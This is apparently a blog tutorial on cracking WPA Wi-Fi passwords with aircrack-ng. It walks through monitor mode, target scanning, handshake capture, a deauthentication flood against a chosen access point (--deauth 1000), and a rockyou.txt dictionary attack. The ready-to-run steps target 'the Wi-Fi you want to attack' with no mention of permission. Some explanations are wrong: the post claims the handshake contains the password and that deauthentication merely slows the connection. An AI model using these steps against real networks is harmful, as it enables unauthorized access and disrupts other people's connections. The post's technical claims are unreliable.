---
title: Perform a simple Wi-Fi attack using Aircrack-ng
categories: [OS, Linux]
tags: [Aircrack-ng, Wi-Fi]
pin: false
image:
  path: ./assets/img/2024/aircrack-ng.jpeg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Aircrack-ng
---

I'll show you how to hack Wi-Fi passwords in this article.

1. To perform the attack, we will first install the [needed software](https://aircrack-ng.org):

```bash
sudo apt install aircrack-ng
```

2. And figure out your wireless card's interface name:

```bash
iwconfig # | ifconfig | ip link
```

Mine looks like `wlp2s0`, and remeber to replace it with your own on the following steps.

3. Free your wireless card from present connection if there's any.

```bash
❯ sudo airmon-ng check rfkillsudo                                  
Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
   1260 avahi-daemon
   1320 NetworkManager
   1323 wpa_supplicant
   1351 avahi-daemon
```

As you can see, this command has sent a clear message.

If we want to continue the attack, we'll need a wireless card in `monitor` mode. 

Hence, let's kill the processes that have our card occupied using the command below:

```bash
❯ sudo airmon-ng check kill 1260 1320 1323 1351
``` 

4. Now we'll find our target.

```bash
sudo airodump-ng wlp2s0
```

Remember wlp2s0? It's my wireless card's name.

Press `Ctrl+C` to stop the searching process if the Wi-Fi you want to attack has been listed.

5. Capture the traffic.

```bash
sudo airodump-ng -c <channel number> --bssid <access point BSSID> wlp2s0 -w <file path>
```

`<channel number>` and the `<bssid>` can be found from last command's output.

Take the command below as an example:

```bash
sudo airodump-ng -c 6 --bssid 0E:2D:EE:66:95:FC wlp2s0 -w ~/Documents/aircrack_capture/wifiname
```

Note that this command will keep running until we have what we wanted captured, which is a `WPA handshack packet` containing the passwords from a certain user's inputs, and press `Ctrl+C`.

6. Deauthentication attacks.

Remember to run this command in a new terminal if you can recall that our last command is still running.

```bash
sudo aireplay-ng -a <bssid> --deauth <time> wlp2s0
```

Take this as an example.

```bash
sudo aireplay-ng -a 0E:2D:EE:66:95:FC --deauth 1000 wlp2s0
```

Some understandings of my own, this command will send lots of packets to the target network, causing a slow connection which stands a chance that a user will have to input the passwords again can reconnect.

And if the certain packet containing the passwords get captured, you'll see `WPA handshake: 0E:2D:EE:66:95:FC` on another terminal's top left corner.

After that, you can kill both running processes.

7. Match the passwords in captured packet.

```bash
sudo aircrack-ng <packet.cap> -w <path to wordslist>
```

In my case, I copied `rockyou.txt` from `Kali`, you can do so or search the internet to find another way.

Note that there's a chance no correct passwords are included in your wordslist.

